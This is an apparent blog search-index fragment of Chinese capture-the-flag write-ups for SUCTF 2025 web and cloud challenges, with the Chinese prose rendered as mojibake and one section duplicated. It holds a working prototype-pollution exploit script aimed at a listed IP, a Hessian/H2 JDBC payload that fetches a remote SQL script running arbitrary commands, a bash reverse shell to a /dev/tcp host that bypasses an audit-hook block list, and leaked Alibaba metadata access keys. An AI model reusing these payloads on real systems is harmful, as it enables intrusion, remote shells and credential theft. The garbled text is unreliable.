08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : 